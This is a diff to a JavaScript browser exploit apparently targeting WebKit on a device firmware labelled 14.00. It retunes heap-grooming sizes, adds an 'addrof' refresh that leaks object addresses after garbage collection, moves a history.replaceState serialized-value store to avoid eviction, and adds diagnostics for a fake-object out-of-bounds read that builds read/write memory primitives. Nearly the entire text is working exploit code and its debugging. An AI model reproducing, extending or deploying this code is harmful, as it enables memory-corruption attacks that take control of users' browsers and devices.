@@ -24,15 +24,17 @@ const FUNCTION_BYTES = 0x20;
 const NATIVE_EXECUTABLE_BYTES = 0x38;
 const HOLDER_BYTES = 0x40;
 
-const CARRIER_SLOTS = (function () {
+let CARRIER_SLOTS = (function () {
   try {
     const q = new URLSearchParams(location.search).get("slots");
     const n = q ? parseInt(q, 10) : 0;
     if (n >= 100000 && n <= 40000000) return n;
   } catch (e) {}
+  // Controlled calibration profile: 2.8M slots (~22.4 MB) lowers pressure
+  // versus the 4.5M source-covered profile while keeping one clean attempt.
   return 2800000;
 })();
-const CARRIER_BYTES = CARRIER_SLOTS * 8;
+let CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
 const COMPOSE_DELAY_MS = 100;
 
@@ -53,17 +55,17 @@ const _gOverride = (function () {
 const _g = (name, dflt) =>
   typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
 if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
-const HISTORY_LOAD_DELAY_MS = _g("histdelay", 0);
-const SSV_CANARY = _g("ssvcanary", 0);
+let HISTORY_LOAD_DELAY_MS = _g("histdelay", 0);
+let SSV_CANARY = _g("ssvcanary", 0);
 
-const DRAIN_SIZE = _g("drainsz", 0x10000);
-const SLAB_SIZE = _g("slab", 0x400000);
-const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
-const SEPARATOR_SIZE = _g("sep", 0x10000);
-const EARLY_HOLE_SIZE = _g("early", 0x70000);
-const GUARD_SIZE = _g("guard", 0x90000);
-const PREDECESSOR_SIZE = _g("pred", 0x80000);
-const FINAL_HOLE_SIZE = _g("final", 0x80000);
+let DRAIN_SIZE = _g("drainsz", 0x10000);
+let SLAB_SIZE = _g("slab", 0x400000);
+let BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
+let SEPARATOR_SIZE = _g("sep", 0x10000);
+let EARLY_HOLE_SIZE = _g("early", 0x70000);
+let GUARD_SIZE = _g("guard", 0x90000);
+let PREDECESSOR_SIZE = _g("pred", 0x80000);
+let FINAL_HOLE_SIZE = _g("final", 0x80000);
 
 const RW_BUFFER_SIZE = 0x100;
 
@@ -73,6 +75,7 @@ const LEAK_SLOT_INDEX = 2;
 const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;
 
 const REVISION = "slopkit-core-1";
+const DIAGNOSTIC_REVISION = "raw13g-core-v60";
 const attemptKey = `${REVISION}:attempts`;
 
 const burstKey = `${REVISION}:burst`;
@@ -159,6 +162,19 @@ let attemptPersisted = false;
 let candidateEverReturned = false;
 let candidateMutationStarted = false;
 let zeroHeaderMiss = false;
+let candidateReadSourceType = "not-read";
+let candidateReadSourceIdentity = "unknown";
+let candidateReadIsArray = false;
+let candidateReadIsView = false;
+let candidateReadUndefined = 0;
+let candidateReadNull = 0;
+let candidateReadNumericZero = 0;
+let candidateReadNumericNonZero = 0;
+let candidateReadNaN = 0;
+let candidateReadString = 0;
+let candidateReadBoolean = 0;
+let candidateReadOther = 0;
+let candidateReadCoercedZero = 0;
 let identityResult = 0;
 
 let compositionState = 0;
@@ -247,6 +263,44 @@ function low48At(bytes, offset) {
 
 function readBytes(destination, source, count) {
   for (let i = 0; i < count; ++i) destination[i] = source[i];
+}
+
+// Same indexed reads and Uint8Array assignments as readBytes(), with counters
+// to distinguish undefined/null/numeric-zero values from coercion to zero.
+function readCandidateHeader(destination, source, count) {
+  candidateReadSourceType = source === null ? "null" : typeof source;
+  candidateReadIsArray = Array.isArray(source);
+  candidateReadIsView = ArrayBuffer.isView(source);
+  candidateReadSourceIdentity =
+    source === referenceTarget ? "reference" :
+    source === fakeHost ? "fake-host" :
+    source === targetHolder ? "holder" : "other";
+
+  candidateReadUndefined = 0;
+  candidateReadNull = 0;
+  candidateReadNumericZero = 0;
+  candidateReadNumericNonZero = 0;
+  candidateReadNaN = 0;
+  candidateReadString = 0;
+  candidateReadBoolean = 0;
+  candidateReadOther = 0;
+  candidateReadCoercedZero = 0;
+
+  for (let i = 0; i < count; ++i) {
+    const value = source[i];
+    if (value === undefined) candidateReadUndefined++;
+    else if (value === null) candidateReadNull++;
+    else if (typeof value === "number") {
+      if (Number.isNaN(value)) candidateReadNaN++;
+      else if (value === 0) candidateReadNumericZero++;
+      else candidateReadNumericNonZero++;
+    } else if (typeof value === "string") candidateReadString++;
+    else if (typeof value === "boolean") candidateReadBoolean++;
+    else candidateReadOther++;
+
+    destination[i] = value;
+    if (destination[i] === 0) candidateReadCoercedZero++;
+  }
 }
 
 function sameBytes(left, right, count) {
@@ -380,7 +434,7 @@ function failed() {
     } catch {}
     attemptNumber++;
     startAttempt();
-  }, Math.max(AUTO_RETRY_DELAY_MS, 750));
+  }, Math.max(AUTO_RETRY_DELAY_MS, 1200));
 }
 
 function releaseAttemptAllocations() {
@@ -462,9 +516,12 @@ function releaseAttemptAllocations() {
     } catch {}
   } else {
     try {
-      // Allocate small throwaway objects to exhaust Eden and trigger minor/major GC
-      for (let i = 0; i < 4000; i++) {
-        void { x: i };
+      // Allocate transient typed buffers to cross JSC GC allocation thresholds
+      for (let i = 0; i < 32; i++) {
+        void new Uint8Array(65536);
+      }
+      for (let i = 0; i < 8000; i++) {
+        void { x: i, y: null };
       }
     } catch {}
   }
@@ -526,7 +583,7 @@ function scheduleSafeRetry(reason) {
       attemptNumber = nextAttempt;
       startAttempt();
     },
-    Math.max(AUTO_RETRY_DELAY_MS, 750),
+    Math.max(AUTO_RETRY_DELAY_MS, 1200),
   );
 }
 
@@ -602,6 +659,19 @@ function resetAttemptState() {
   candidateMutationStarted = false;
   zeroHeaderMiss = false;
   identityResult = 0;
+  candidateReadSourceType = "not-read";
+  candidateReadSourceIdentity = "unknown";
+  candidateReadIsArray = false;
+  candidateReadIsView = false;
+  candidateReadUndefined = 0;
+  candidateReadNull = 0;
+  candidateReadNumericZero = 0;
+  candidateReadNumericNonZero = 0;
+  candidateReadNaN = 0;
+  candidateReadString = 0;
+  candidateReadBoolean = 0;
+  candidateReadOther = 0;
+  candidateReadCoercedZero = 0;
   identityBytes.fill(0);
   compositionState = 0;
   compositionLength = 0;
@@ -755,20 +825,13 @@ function buildAndStoreGraph() {
   outerGraph[2] = referenceTarget;
   outerGraph[CONTROL_INDEX] = CONTROL_INT;
   emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
-
-  emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
-  history.replaceState(outerGraph, "");
-  emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
-  if (SSV_CANARY > 0) {
-    try {
-      let canary = history.state;
-      const ok = canary && canary[1] === canary[2];
-      emit("SSV-CANARY-OK", `len=${canary ? canary.length : "null"}-match=${ok}`);
-      canary = null;
-    } catch (canaryErr) {
-      emit("SSV-CANARY-FAIL", `${canaryErr?.name}:${canaryErr?.message}`);
-    }
-  }
+  // history.replaceState is intentionally deferred: storing the SSV here and
+  // leaving it in session history across the full groom (24–36 MB of drain +
+  // slab allocations) causes the WebKit process to evict the history entry
+  // under memory pressure on 14.00, producing "Unable to deserialize data"
+  // when history.state is later read.  The store is moved to runGroomAndLoad,
+  // immediately before the history.state read, so the SSV never lives across
+  // the large allocation phase.  See runGroomAndLoad for the deferred store.
 }
 
 function prepareAddrof() {
@@ -876,7 +939,7 @@ function loadHistoryCritical() {
     result = null;
 
     stage = "candidate-read";
-    readBytes(rwHeader, candidate, CELL_BYTES);
+    readCandidateHeader(rwHeader, candidate, CELL_BYTES);
     rwHeaderCaptured = true;
 
     const rwSID = uint32At(rwHeader, 0);
@@ -1186,6 +1249,51 @@ function runGroomAndLoad() {
     channel.port1.postMessage(0, [slab]);
     slab = null;
 
+    // Re-run addrof after drain+slab to capture a fresh fakeAddress.
+    //
+    // The Eden GC can run during the drain+slab allocation phase (~20 MB),
+    // copying fakeHost to a new address and making the previously leaked
+    // hostAddress stale.  Filling the predecessor with a stale fakeAddress
+    // means the candidate that comes back from the SSV OOB read points to
+    // freed/zeroed memory, causing ZERO-HEADER-MISS even when the SSV
+    // exploit itself triggered correctly (result.length == EXPECTED_LENGTH).
+    //
+    // Re-running the addrof here (after the large allocations, before holes)
+    // gives us the current cell address of fakeHost and refreshes fakeAddress,
+    // targetAddress, and the carrier-aim words before the predecessor is filled.
+    stage = "addrof-refresh";
+    try {
+      const freshCapture = symbolToString.call(preparedSymbolObject);
+      emit("ADDROF-REFRESH-COPY", "chars=" + (freshCapture ? freshCapture.length : 0));
+      if (freshCapture && freshCapture.length >= 23) {
+        const freshWords = new Uint16Array(16);
+        for (let i = 0; i < 16; i++)
+          freshWords[i] = freshCapture.charCodeAt(7 + i);
+        const freshHost = pointerFromWords(freshWords, 0);
+        const freshTarget = pointerFromWords(freshWords, 4);
+        if (plausibleCell(freshHost) && plausibleCell(freshTarget)) {
+          const prevFake = fakeAddress;
+          hostAddress = freshHost;
+          fakeAddress = freshHost + 0x10;
+          targetAddress = freshTarget;
+          targetAddressLow = freshTarget >>> 0;
+          targetAddressHigh = Math.floor(freshTarget / 0x100000000);
+          emit(
+            "ADDROF-REFRESHED",
+            `moved=${prevFake !== fakeAddress}` +
+              `-prev-fake=${hex(prevFake)}` +
+              `-new-fake=${hex(fakeAddress)}`,
+          );
+        } else {
+          emit("ADDROF-REFRESH-SKIP", "implausible-fresh-capture");
+        }
+      } else {
+        emit("ADDROF-REFRESH-SKIP", "short-fresh-capture");
+      }
+    } catch (refreshErr) {
+      emit("ADDROF-REFRESH-SKIP", `threw-${refreshErr?.name}`);
+    }
+
     stage = "holes";
     const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
     const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
@@ -1215,6 +1323,17 @@ function runGroomAndLoad() {
       earlyHole,
       finalHole,
     ]);
+
+    // Deferred SSV store: holes are freed above, so the JS heap has room.
+    // Storing the SSV here (not in buildAndStoreGraph) ensures the history
+    // entry is never live during the drain+slab allocation phase, preventing
+    // the session-history eviction that caused "Unable to deserialize data"
+    // on 14.00 under memory pressure.
+    stage = "ssv-store";
+    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
+    history.replaceState(outerGraph, "");
+    emit("SSV-STORED", "deferred-post-holes");
+
     if (HISTORY_LOAD_DELAY_MS > 0) {
       emit("SSV-HISTORY-DELAY", `ms=${HISTORY_LOAD_DELAY_MS}`);
       setTimeout(finishHistoryLoad, HISTORY_LOAD_DELAY_MS);
@@ -1383,6 +1502,24 @@ function reportComposition() {
         `-identity=${identityResult}` +
         `-hex=${dumpHex(rwHeader, CELL_BYTES)}`,
     );
+    if (zeroHeaderMiss) {
+      emit(
+        "CANDIDATE-HEADER-SOURCE",
+        `type=${candidateReadSourceType}` +
+          `-identity=${candidateReadSourceIdentity}` +
+          `-array=${candidateReadIsArray}` +
+          `-view=${candidateReadIsView}` +
+          `-undefined=${candidateReadUndefined}` +
+          `-null=${candidateReadNull}` +
+          `-numeric-zero=${candidateReadNumericZero}` +
+          `-numeric-nonzero=${candidateReadNumericNonZero}` +
+          `-nan=${candidateReadNaN}` +
+          `-string=${candidateReadString}` +
+          `-boolean=${candidateReadBoolean}` +
+          `-other=${candidateReadOther}` +
+          `-coerced-zero=${candidateReadCoercedZero}`,
+      );
+    }
     if (!retrySafe) failed();
     else
       scheduleSafeRetry(
@@ -1561,9 +1698,39 @@ export function establishPrimitive(options) {
       ? opts.maxAttempts
       : 0;
 
+  // Apply firmware-specific groom overrides.
+  // URL params (via _gOverride) take precedence; off.groom is the firmware default.
+  if (opts.groomOverrides && typeof opts.groomOverrides === "object") {
+    const go = opts.groomOverrides;
+    // An explicit ?slots= value wins; otherwise use the firmware-specific profile.
+    let hasSlotsQuery = false;
+    try { hasSlotsQuery = new URLSearchParams(location.search).has("slots"); } catch (e) {}
+    if (!hasSlotsQuery && Number.isInteger(go.slots) && go.slots >= 100000 && go.slots <= 40000000) {
+      CARRIER_SLOTS = go.slots;
+      CARRIER_BYTES = CARRIER_SLOTS * 8;
+    }
+    if (typeof go.drain === "number" && typeof _gOverride.drain !== "number") DRAIN_COUNT = go.drain;
+    if (typeof go.drainsz === "number" && typeof _gOverride.drainsz !== "number") DRAIN_SIZE = go.drainsz;
+    if (typeof go.slab === "number" && typeof _gOverride.slab !== "number") SLAB_SIZE = go.slab;
+    if (typeof go.histdelay === "number" && typeof _gOverride.histdelay !== "number") HISTORY_LOAD_DELAY_MS = go.histdelay;
+    if (typeof go.bfly === "number" && typeof _gOverride.bfly !== "number") BUTTERFLY_HOLE_SIZE = go.bfly;
+    if (typeof go.sep === "number" && typeof _gOverride.sep !== "number") SEPARATOR_SIZE = go.sep;
+    if (typeof go.early === "number" && typeof _gOverride.early !== "number") EARLY_HOLE_SIZE = go.early;
+    if (typeof go.guard === "number" && typeof _gOverride.guard !== "number") GUARD_SIZE = go.guard;
+    if (typeof go.pred === "number" && typeof _gOverride.pred !== "number") PREDECESSOR_SIZE = go.pred;
+    if (typeof go.final === "number" && typeof _gOverride.final !== "number") FINAL_HOLE_SIZE = go.final;
+  }
+
   running = true;
   stopped = false;
   attemptNumber = 1;
+  emit("CORE-REVISION", DIAGNOSTIC_REVISION);
+  emit(
+    "MEMORY-CONFIG",
+    `carrier-slots=${CARRIER_SLOTS}-carrier-bytes=${CARRIER_BYTES}` +
+      `-drain-count=${DRAIN_COUNT}-drain-bytes=${DRAIN_COUNT * DRAIN_SIZE}` +
+      `-slab-bytes=${SLAB_SIZE}`,
+  );
   try {
     sessionStorage.removeItem(attemptKey);
   } catch {}
